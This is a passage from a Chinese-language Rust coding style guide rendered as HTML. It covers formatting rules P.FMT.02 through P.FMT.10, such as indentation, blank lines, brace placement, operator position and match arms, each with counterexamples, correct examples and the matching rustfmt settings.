            0x00, 0x05, 0x01, 0x00,
            0xff,
            0x00,
            0x00,
    
            0x01, 0x0c, 0x02, 0x00,
            0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef,
            b'd', b'e', b'a', b'd', b'b', b'e', b'e', b'f', 0x00,
            0x00,
    
            127, 0x06, 0x03, 0x00,
            0x01, 0x02,
            b'a', b'b', b'c', b'd', 0x00,
            b'1', b'2', b'3', b'4', 0x00,
            0x00,
    ];
}
</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pfmt02--缩进使用空格而非制表符"><a class="header" href="#pfmt02--缩进使用空格而非制表符">P.FMT.02  缩进使用空格而非制表符</a></h2>
<p><strong>【描述】</strong></p>
<p>缩进要使用四个空格，不要使用制表符（<code>\t</code>）代替。可以通过 IDE 或编辑器把缩进设置为四个空格。</p>
<p><strong>【rustfmt 配置】</strong></p>
<table><thead><tr><th>对应选项</th><th>可选值</th><th>是否 stable</th><th>说明</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rustfmt/#tab_spaces"><code>tab_spaces</code></a></td><td>4</td><td>yes（默认）</td><td>缩进空格数｜</td></tr>
<tr><td><a href="https://rust-lang.github.io/rustfmt/#hard_tabs"><code>hard_tabs</code></a></td><td>false</td><td>yes（默认）</td><td>禁止使用tab缩进｜</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pfmt03--行间距最大宽度空一行"><a class="header" href="#pfmt03--行间距最大宽度空一行">P.FMT.03  行间距最大宽度空一行</a></h2>
<p><strong>【描述】</strong></p>
<p>代码行之间，最小间隔 <code>0</code> 行，最大间隔<code>1</code>行。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn foo() {
    println!(&quot;a&quot;);
}
// 不符合：空两行 
// 不符合：空两行
fn bar() {
    println!(&quot;b&quot;);
// 不符合：空两行 
// 不符合：空两行
    println!(&quot;c&quot;);
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn foo() {
    println!(&quot;a&quot;);
}
// 符合：空一行 
fn bar() {
    println!(&quot;b&quot;);
    println!(&quot;c&quot;);
}
<span class="boring">}
</span></code></pre></pre>
<p>或者</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn foo() {
    println!(&quot;a&quot;);
}
fn bar() {
    println!(&quot;b&quot;);
	// 符合：空一行 
    println!(&quot;c&quot;);
}

<span class="boring">}
</span></code></pre></pre>
<p><strong>【rustfmt 配置】</strong></p>
<table><thead><tr><th>对应选项</th><th>可选值</th><th>是否 stable</th><th>说明</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#blank_lines_lower_bound"><code>blank_lines_lower_bound</code></a></td><td>0（默认）</td><td>No</td><td>不空行</td></tr>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#blank_lines_upper_bound"><code>blank_lines_upper_bound</code></a></td><td>1（默认）</td><td>No</td><td>最大空一行</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pfmt04--语言项item-定义时左花括号brace位置应该与语言项保持同一行"><a class="header" href="#pfmt04--语言项item-定义时左花括号brace位置应该与语言项保持同一行">P.FMT.04  语言项（Item) 定义时左花括号（brace）位置应该与语言项保持同一行</a></h2>
<p><strong>【描述】</strong></p>
<p>为了保持代码结构的良好可读性，Rust 中定义各种语言项，包括控制结构（<code>if / match</code> 等）、函数、结构体、枚举等，要求左花括号与其定义保持同一行。</p>
<p>但是如果携带 <code>where</code>语句，则要求换行，并且<code>where</code> 子句和 <code>where</code> 关键字不在同一行。</p>
<p><code>rustfmt</code> 提供三个配置项对不同的语言项进行格式化：</p>
<ul>
<li><code>brace_style</code> 配置项对应于大部分语言项，包括函数、结构体等，但是控制结构（<code>if / match</code>等）除外，默认值为<code>SameLineWhere</code>，代表左花括号与语言项定义保持同一行。</li>
<li><code>where_single_line</code> 配置项对应于 <code>where</code> 语句，默认值是 <code>false</code>，表示 <code>where</code>语句的花括号是换行。</li>
<li><code>control_brace_style</code> 配置项对应于控制结构（<code>if / match</code>等），默认值为<code>AlwaysSameLine</code>，表示左花括号与语言项定义保持同一行。</li>
</ul>
<p>所以，只需要使用 <code>rustfmt</code> 默认配置即可。</p>
<p><strong>【反例】</strong></p>
<p>如果设置 <code>brace_style = &quot;AlwaysNextLine&quot;</code>，则不符合。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合： 左花括号与函数语言项定义未保持同一行
fn lorem()
{
    // body
}
<span class="boring">}
</span></code></pre></pre>
<p>如果设置 <code>brace_style = &quot;PreferSameLine&quot;</code>，则符合：</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合： 左花括号与 where 语句 应该换行
fn lorem&lt;T&gt;(ipsum: T)
where
    T: Add + Sub + Mul + Div, { // 注意这里和 `SameLineWhere`的区别
    // body
}
<span class="boring">}
</span></code></pre></pre>
<p>结构体与枚举：</p>
<p>如果设置 <code>brace_style = &quot;AlwaysNextLine&quot;</code>，则不符合：</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合： 左花括号与结构体语言项定义未保持同一行
struct Lorem
{
    ipsum: bool,
}
<span class="boring">}
</span></code></pre></pre>
<p>如果设置 <code>brace_style = &quot;PreferSameLine&quot;</code>，则符合：</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合： 左花括号与 where 语句应该换行
struct Dolor&lt;T&gt;
where
    T: Eq, {
    sit: T,
}
<span class="boring">}
</span></code></pre></pre>
<p>流程控制倾向于默认使用 <code>AlwaysSameLine</code>，即，总在同一行。因为流程控制没有<code>where</code>子句。</p>
<p>如果设置 <code>brace_style = &quot;AlwaysNextLine&quot;</code>，则不符合：</p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    // 不符合： 左花括号与控制结构未保持同一行
    if lorem
    {
        println!(&quot;ipsum!&quot;);
    }
    else
    {
        println!(&quot;dolor!&quot;);
    }
}
</code></pre></pre>
<p><strong>【正例】</strong></p>
<p>函数：</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合： 左花括号和 函数语言项定义在同一行
fn lorem() { 
    // body
}

fn lorem&lt;T&gt;(ipsum: T)
where // 符合：`where` 子句和 `where` 关键字不在同一行
    T: Add + Sub + Mul + Div,
{ // 符合：当有 `where` 子句的时候，花括号换行
    // body
}
<span class="boring">}
</span></code></pre></pre>
<p>结构体与枚举</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
struct Lorem {
    ipsum: bool,
}

// 符合
struct Dolor&lt;T&gt;
where 
    T: Eq,
{
    sit: T,
}
<span class="boring">}
</span></code></pre></pre>
<p>流程控制倾向于默认使用 <code>AlwaysSameLine</code>，即，总在同一行。因为流程控制没有<code>where</code>子句。</p>
<pre><pre class="playground"><code class="language-rust">// 符合
// &quot;AlwaysSameLine&quot; (default)
fn main() {
    if lorem {
        println!(&quot;ipsum!&quot;);
    } else {
        println!(&quot;dolor!&quot;);
    }
}
</code></pre></pre>
<p><strong>【rustfmt 配置】</strong></p>
<table><thead><tr><th>对应选项</th><th>可选值</th><th>是否 stable</th><th>说明</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#brace_style"><code>brace_style</code></a></td><td>SameLineWhere （默认）</td><td>No</td><td>应该与语言项保持同一行，但是 where 语句例外</td></tr>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#brace_style"><code>brace_style</code></a></td><td>AlwaysNextLine</td><td>No</td><td>应该在语言项的下一行</td></tr>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#brace_style"><code>brace_style</code></a></td><td>PreferSameLine</td><td>No</td><td>总是优先与语言项保持同一行，where 语句也不例外</td></tr>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#where_single_line"><code>where_single_line</code></a></td><td>false（默认）</td><td>No</td><td>强制将 <code>where</code> 子句放在同一行上</td></tr>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#control_brace_style"><code>control_brace_style</code> in control-flow</a></td><td>AlwaysSameLine （默认）</td><td>No</td><td>总在同一行上，用于控制流程中默认值</td></tr>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#control_brace_style"><code>control_brace_style</code> in control-flow</a></td><td>ClosingNextLine</td><td>No</td><td>用于控制流程中 else 分支在 if 分支结尾处换行</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pfmt05-存在多个标识符时应该保持块状block缩进"><a class="header" href="#pfmt05-存在多个标识符时应该保持块状block缩进">P.FMT.05 存在多个标识符时应该保持块状（Block）缩进</a></h2>
<p><strong>【描述】</strong></p>
<p>当在表达式或语言项定义中出现多个标识符，则应该让其保持块状风格缩进。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    // 不符合：缩进不符合标准，只是为了对齐
    let lorem = vec![&quot;ipsum&quot;,
                     &quot;dolor&quot;,
                     &quot;sit&quot;,
                     &quot;amet&quot;,
                     &quot;consectetur&quot;,
                     &quot;adipiscing&quot;,
                     &quot;elit&quot;];
}
</code></pre></pre>
<p>流程控制</p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    // 不符合：缩进不符合标准，只是为了对齐
    if lorem_ipsum
       &amp;&amp; dolor_sit // 注意：这里缩进只是三个空格，仅仅是和前一行 `lorem_ipsum`对齐
       &amp;&amp; amet_consectetur
       &amp;&amp; lorem_sit
       &amp;&amp; dolor_consectetur
       &amp;&amp; amet_ipsum
       &amp;&amp; lorem_consectetur
    {
        // ...
    }
}
</code></pre></pre>
<p>函数参数</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn lorem() {}

fn lorem(ipsum: usize) {}
// 不符合
fn lorem(ipsum: usize,
         dolor: usize,
         sit: usize,
         amet: usize,
         consectetur: usize,
         adipiscing: usize,
         elit: usize) {
    // body
}
<span class="boring">}
</span></code></pre></pre>
<p>函数调用</p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    // 不符合
    lorem(&quot;lorem&quot;,
          &quot;ipsum&quot;,
          &quot;dolor&quot;,
          &quot;sit&quot;,
          &quot;amet&quot;,
          &quot;consectetur&quot;,
          &quot;adipiscing&quot;,
          &quot;elit&quot;);
}
</code></pre></pre>
<p>泛型</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合
fn lorem&lt;Ipsum: Eq = usize,
         Dolor: Eq = usize,
         Sit: Eq = usize,
         Amet: Eq = usize,
         Adipiscing: Eq = usize,
         Consectetur: Eq = usize,
         Elit: Eq = usize&gt;(
    ipsum: Ipsum,
    dolor: Dolor,
    sit: Sit,
    amet: Amet,
    adipiscing: Adipiscing,
    consectetur: Consectetur,
    elit: Elit)
    -&gt; T {
    // body
}
<span class="boring">}
</span></code></pre></pre>
<p>结构体</p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    let lorem = Lorem { ipsum: dolor,
                        sit: amet };
}
</code></pre></pre>
<p><strong>【正例】</strong></p>
<p>数组：</p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    // 符合： 缩进四个空格
    let lorem = vec![
        &quot;ipsum&quot;,
        &quot;dolor&quot;,
        &quot;sit&quot;,
        &quot;amet&quot;,
        &quot;consectetur&quot;,
        &quot;adipiscing&quot;,
        &quot;elit&quot;,
    ];
}
</code></pre></pre>
<p>流程控制</p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    // 符合： 缩进四个空格
    if lorem_ipsum
        &amp;&amp; dolor_sit
        &amp;&amp; amet_consectetur
        &amp;&amp; lorem_sit
        &amp;&amp; dolor_consectetur
        &amp;&amp; amet_ipsum
        &amp;&amp; lorem_consectetur
    {
        // ...
    }
}
</code></pre></pre>
<p>函数参数</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn lorem() {}

fn lorem(ipsum: usize) {}

// 符合： 缩进四个空格
fn lorem(
    ipsum: usize,
    dolor: usize,
    sit: usize,
    amet: usize,
    consectetur: usize,
    adipiscing: usize,
    elit: usize,
) {
    // body
}

<span class="boring">}
</span></code></pre></pre>
<p>函数调用</p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    // 符合： 缩进四个空格
    lorem(
        &quot;lorem&quot;,
        &quot;ipsum&quot;,
        &quot;dolor&quot;,
        &quot;sit&quot;,
        &quot;amet&quot;,
        &quot;consectetur&quot;,
        &quot;adipiscing&quot;,
        &quot;elit&quot;,
    );
}
</code></pre></pre>
<p>泛型</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合： 缩进四个空格
fn lorem&lt;
    Ipsum: Eq = usize,
    Dolor: Eq = usize,
    Sit: Eq = usize,
    Amet: Eq = usize,
    Adipiscing: Eq = usize,
    Consectetur: Eq = usize,
    Elit: Eq = usize,
&gt;(
    ipsum: Ipsum,
    dolor: Dolor,
    sit: Sit,
    amet: Amet,
    adipiscing: Adipiscing,
    consectetur: Consectetur,
    elit: Elit,
) -&gt; T {
    // body
}
<span class="boring">}
</span></code></pre></pre>
<p>结构体</p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    let lorem = Lorem {
        ipsum: dolor,
        sit: amet,
    };
}
</code></pre></pre>
<p><strong>【rustfmt 配置】</strong></p>
<table><thead><tr><th>对应选项</th><th>可选值</th><th>是否 stable</th><th>说明</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#indent_style"><code>indent_style</code></a></td><td>Block（默认）</td><td>No</td><td>多个标识符定义保持块状风格，缩进符合标准</td></tr>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#indent_style"><code>indent_style</code></a></td><td>Visual</td><td>No</td><td>多个标识符定义保持对齐风格，但不符合缩进标准</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pfmt06--当有多行表达式操作时操作符应该置于行首"><a class="header" href="#pfmt06--当有多行表达式操作时操作符应该置于行首">P.FMT.06  当有多行表达式操作时，操作符应该置于行首</a></h2>
<p><strong>【描述】</strong></p>
<p>当有多行表达式操作时，操作符应该置于行首，这样有利于代码的可读性和可维护性。</p>
<p><strong>【反例】</strong></p>
<p>操作符置于行尾</p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    // 不符合
    let or = foofoofoofoofoofoofoofoofoofoofoofoofoofoofoofoo ||
        barbarbarbarbarbarbarbarbarbarbarbarbarbarbarbar;
    // 不符合
    let sum = 123456789012345678901234567890 +
        123456789012345678901234567890 +
        123456789012345678901234567890;
    // 不符合
    let range = aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa..
        bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb;
}
</code></pre></pre>
<p><strong>【正例】</strong></p>
<p>操作符置于行首</p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    // 符合
    let or = foofoofoofoofoofoofoofoofoofoofoofoofoofoofoofoo
        || barbarbarbarbarbarbarbarbarbarbarbarbarbarbarbar;

    // 符合
    let sum = 123456789012345678901234567890
        + 123456789012345678901234567890
        + 123456789012345678901234567890;
    // 符合
    let range = aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
        ..bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb;
}
</code></pre></pre>
<p><strong>【rustfmt 配置】</strong></p>
<table><thead><tr><th>对应选项</th><th>可选值</th><th>是否 stable</th><th>说明</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#binop_separator"><code>binop_separator</code></a></td><td>Front（默认）</td><td>No</td><td>换行后，操作符置于行首</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pfmt07-枚举变体和结构体字段都应左对齐"><a class="header" href="#pfmt07-枚举变体和结构体字段都应左对齐">P.FMT.07 枚举变体和结构体字段都应左对齐</a></h2>
<p><strong>【描述】</strong></p>
<p>对于自定义了判别式的枚举体，和有字段的结构体而言，默认只需要左对齐就可以。</p>
<p>这个宽度可以设置为任意值，但默认是<code>0</code>。</p>
<blockquote>
<p>说明：此宽度并不是指插入多少空格，而是指需要对齐的字符长度。</p>
</blockquote>
<p><strong>【反例】</strong></p>
<p>当 <code>enum_discrim_align_threshold = 20</code> 时。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合： 设置了变体长度最大是20
enum Foo {
    A   = 0,
    Bb  = 1,
    RandomLongVariantGoesHere = 10, // 注意，该变体长度已经超过了20，所以它不会被对齐
    Ccc = 2,
}

enum Bar {
    VeryLongVariantNameHereA = 0, // 注意，该变体长度已经超过了20，所以它不会被对齐
    VeryLongVariantNameHereBb = 1, // 注意，该变体长度已经超过了20，所以它不会被对齐
    VeryLongVariantNameHereCcc = 2,// 注意，该变体长度已经超过了20，所以它不会被对齐
}
<span class="boring">}
</span></code></pre></pre>
<p>当 <code>enum_discrim_align_threshold = 50</code> 时。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合： 因为通过更改配置值填充了空格
enum Foo {
    A                         = 0,
    Bb                        = 1,
    RandomLongVariantGoesHere = 10, // 注意，该变体长度未超过50，所以它会被对齐
    Ccc                       = 2,
}

enum Bar {
    VeryLongVariantNameHereA   = 0, // 注意，该变体长度未超过50，所以它会被对齐
    VeryLongVariantNameHereBb  = 1, // 注意，该变体长度未超过50，所以它会被对齐
    VeryLongVariantNameHereCcc = 2, // 注意，该变体长度未超过50，所以它会被对齐
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合: 无论变体长度多长，都左对齐
enum Bar {
    A = 0,
    Bb = 1,
    RandomLongVariantGoesHere = 10,
    Ccc = 71,
}
// 符合
enum Bar {
    VeryLongVariantNameHereA = 0,
    VeryLongVariantNameHereBb = 1,
    VeryLongVariantNameHereCcc = 2,
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【rustfmt 配置】</strong></p>
<table><thead><tr><th>对应选项</th><th>可选值</th><th>是否 stable</th><th>说明</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#enum_discrim_align_threshold"><code>enum_discrim_align_threshold</code></a></td><td>0（默认）</td><td>No</td><td>具有判别式的枚举变体与其他变体进行垂直对齐的最大长度</td></tr>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#struct_field_align_threshold"><code>struct_field_align_threshold</code></a></td><td>0（默认）</td><td>No</td><td>结构体字段垂直对齐的最大长度</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pfmt08--函数参数超过五个或导入模块个数超过四个需换行"><a class="header" href="#pfmt08--函数参数超过五个或导入模块个数超过四个需换行">P.FMT.08  函数参数超过五个或导入模块个数超过四个需换行</a></h2>
<p><strong>【描述】</strong></p>
<ol>
<li>五个以内函数参数可以置于一行，超过五个则使用「块」状缩进。</li>
<li>导入模块每行超过四个，则换行。</li>
</ol>
<p><strong>【反例】</strong></p>
<p>当 rustfmt 配置型 <code>fn_args_layout</code> 和 <code>imports_layout</code> 未使用默认值：</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>trait Lorem {
    fn lorem(ipsum: Ipsum, dolor: Dolor, sit: Sit, amet: Amet);

    fn lorem(ipsum: Ipsum, dolor: Dolor, sit: Sit, amet: Amet) {
        // body
    }

    // 不符合： 超过五个参数未使用块状缩进
    fn lorem(
        ipsum: Ipsum, dolor: Dolor, sit: Sit, amet: Amet, consectetur: Consectetur,
        adipiscing: Adipiscing, elit: Elit,
    );

    fn lorem(
        ipsum: Ipsum, dolor: Dolor, sit: Sit, amet: Amet, consectetur: Consectetur,
        adipiscing: Adipiscing, elit: Elit,
    ) {
        // body
    }
}

use foo::{xxxxxxxxxxxxxxxxxx, yyyyyyyyyyyyyyyyyy, zzzzzzzzzzzzzzzzzz};

// 不符合： 模块换行即可，无需使用块状缩进
use foo::{
    aaaaaaaaaaaaaaaaaa,
    bbbbbbbbbbbbbbbbbb,
    cccccccccccccccccc,
    dddddddddddddddddd,
    eeeeeeeeeeeeeeeeee,
    ffffffffffffffffff,
};
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<p>当 rustfmt 配置项 <code>fn_args_layout</code> 和 <code>imports_layout</code> 使用默认值时：</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>
<span class="boring">fn main() {
</span>trait Lorem {
    fn lorem(ipsum: Ipsum, dolor: Dolor, sit: Sit, amet: Amet, consectetur: Consectetur);

    fn lorem(ipsum: Ipsum, dolor: Dolor, sit: Sit, amet: Amet) {
        // body
    }

    // 符合
    fn lorem(
        ipsum: Ipsum,
        dolor: Dolor,
        sit: Sit,
        amet: Amet,
        consectetur: Consectetur,
        adipiscing: Adipiscing,
        elit: Elit,
    );

    // 符合
    fn lorem(
        ipsum: Ipsum,
        dolor: Dolor,
        sit: Sit,
        amet: Amet,
        consectetur: Consectetur,
        adipiscing: Adipiscing,
        elit: Elit,
    ) {
        // body
    }
}

use foo::{xxxxxxxxxxxxxxxxxx, yyyyyyyyyyyyyyyyyy, zzzzzzzzzzzzzzzzzz};

// 符合
use foo::{
    aaaaaaaaaaaaaaaaaa, bbbbbbbbbbbbbbbbbb, cccccccccccccccccc, dddddddddddddddddd,
    eeeeeeeeeeeeeeeeee,
};
<span class="boring">}
</span></code></pre></pre>
<p><strong>【rustfmt 配置】</strong></p>
<table><thead><tr><th>对应选项</th><th>可选值</th><th>是否 stable</th><th>说明</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#fn_args_layout"><code>fn_args_layout</code></a></td><td>Tall（默认）</td><td>Yes</td><td>函数参数五个或以内可以一行，超过五个则使用块状缩进</td></tr>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#imports_layout"><code>imports_layout</code></a></td><td>Mixed（默认）</td><td>No</td><td>导入模块每行超过四个则换行</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pfmt09--不同的场景使用不同的空格风格"><a class="header" href="#pfmt09--不同的场景使用不同的空格风格">P.FMT.09  不同的场景，使用不同的空格风格</a></h2>
<p><strong>【描述】</strong></p>
<ol>
<li>在冒号之后添加空格，在冒号之前不要加空格。</li>
<li>在范围（range）操作符（<code>..</code>和<code>..=</code>）前后不要使用空格。</li>
<li>在<code>+</code>或<code>=</code>操作符前后要加空格。</li>
</ol>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合： 冒号之后未加空格
// 当 `space_after_colon=false`
fn lorem&lt;T:Eq&gt;(t:T) {
    let lorem:Dolor = Lorem {
        ipsum:dolor,
        sit:amet,
    };
}

// 不符合： 冒号之前加空格
// 当 `space_before_colon=true`
fn lorem&lt;T : Eq&gt;(t : T) {
    let lorem : Dolor = Lorem {
        ipsum : dolor,
        sit : amet,
    };
}

// 不符合： `..`前后加空格
// 当 `spaces_around_ranges=true`
let lorem = 0 .. 10;
let ipsum = 0 ..= 10;

// 不符合： `+`和`=`前后加空格
// 当 `type_punctuation_density=&quot;Compressed&quot;`
fn lorem&lt;Ipsum: Dolor+Sit=Amet&gt;() {
    // body
    let answer = 1 + 2;
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
// 当 `space_after_colon=true`
fn lorem&lt;T: Eq&gt;(t: T) {
    let lorem: Dolor = Lorem {
        ipsum: dolor,
        sit: amet,
    };
}

// 符合
// 当 `space_before_colon=false`
fn lorem&lt;T: Eq&gt;(t: T) {
    let lorem: Dolor = Lorem {
        ipsum: dolor,
        sit: amet,
    };
}

// 符合
// 当 `spaces_around_ranges=false`
let lorem = 0..10;
let ipsum = 0..=10;

// 符合
// 当 `type_punctuation_density=&quot;Wide&quot;`
fn lorem&lt;Ipsum: Dolor + Sit = Amet&gt;() {
    // body
    let answer = 1 + 2;
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【rustfmt 配置】</strong></p>
<table><thead><tr><th>对应选项</th><th>可选值</th><th>是否 stable</th><th>说明</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#space_after_colon"><code>space_after_colon</code></a></td><td>true（默认）</td><td>No</td><td>在冒号后面要加空格</td></tr>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#space_before_colon"><code>space_before_colon</code></a></td><td>false（默认）</td><td>No</td><td>在冒号前面不要加空格</td></tr>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#spaces_around_ranges"><code>spaces_around_ranges</code></a></td><td>false（默认）</td><td>No</td><td>在<code>..</code>和<code>..=</code>范围操作符前后不要加空格</td></tr>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#type_punctuation_density"><code>type_punctuation_density</code></a></td><td>&quot;Wide&quot;（默认）</td><td>No</td><td>在 <code>+</code>或<code>=</code>操作符前后要加空格（此处特指类型签名）</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pfmt10--match-分支应该具有良好的可读性"><a class="header" href="#pfmt10--match-分支应该具有良好的可读性">P.FMT.10  <code>match</code> 分支应该具有良好的可读性</a></h2>
<p><strong>【描述】</strong></p>
<ol>
<li>当match分支右侧代码体太长无法和<code>=&gt;</code>置于同一行需要使用块(block)来包裹。</li>
<li>在match分支左侧匹配表达式前不要增加管道符(<code>|</code>)</li>
</ol>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">// 不符合： 与 `=&gt;` 不同行应该用块来包裹
// 当 `match_arm_blocks=false`
fn main() {
    match lorem {
        ipsum =&gt; 
            foooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo(x),
        dolor =&gt; println!(&quot;{}&quot;, sit),
        sit =&gt; foo(
            &quot;foooooooooooooooooooooooo&quot;,
            &quot;baaaaaaaaaaaaaaaaaaaaaaaarr&quot;,
            &quot;baaaaaaaaaaaaaaaaaaaazzzzzzzzzzzzz&quot;,
            &quot;qqqqqqqqquuuuuuuuuuuuuuuuuuuuuuuuuuxxx&quot;,
        ),
    }
}

// 当 `match_arm_leading_pipes=&quot;Alaways&quot;`
fn foo() {
    match foo {
        // 不符合： 分支左侧匹配表达式前不要加管道符
        | &quot;foo&quot; | &quot;bar&quot; =&gt; {}
        | &quot;baz&quot;
        | &quot;something relatively long&quot;
        | &quot;something really really really realllllllllllllly long&quot; =&gt; println!(&quot;x&quot;),
        | &quot;qux&quot; =&gt; println!(&quot;y&quot;),
        | _ =&gt; {}
    }
}
</code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">// 当 `match_arm_blocks=true`
fn main() {
    match lorem {
        // 符合
        ipsum =&gt; { 
            foooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo(x)
        }
        dolor =&gt; println!(&quot;{}&quot;, sit),
        // 符合
        sit =&gt; foo(
            &quot;foooooooooooooooooooooooo&quot;,
            &quot;baaaaaaaaaaaaaaaaaaaaaaaarr&quot;,
            &quot;baaaaaaaaaaaaaaaaaaaazzzzzzzzzzzzz&quot;,
            &quot;qqqqqqqqquuuuuuuuuuuuuuuuuuuuuuuuuuxxx&quot;,
        ),
    }
}

// 当 `match_arm_leading_pipes=&quot;Never&quot;`
fn foo() {

    match foo {
        // 符合
        &quot;foo&quot; | &quot;bar&quot; =&gt; {}
        &quot;baz&quot;
        | &quot;something relatively long&quot;
        | &quot;something really really really realllllllllllllly long&quot; =&gt; println!(&quot;x&quot;),
        &quot;qux&quot; =&gt; println!(&quot;y&quot;),
        _ =&gt; {}
    }
}
</code></pre></pre>
<p><strong>【rustfmt 配置】</strong></p>
<table><thead><tr><th>对应选项</th><th>可选值</th><th>是否 stable</th><th>说明</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#match_arm_blocks"><code>match_arm_blocks</code></a></td><td>true（默认）</td><td>No</td><td>当match分支右侧代码体太长无法和<code>=&gt;</code>置于同一行需要使用块(block)来包裹</td></tr>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#match_arm_leading_pipes"><code>match_arm_leading_pipes</code></a></td><td>Never（默认）</td><td>No</td><td>在match分支左侧匹配表达式前不要增加管道符(`</td></tr>
</tbody></table>
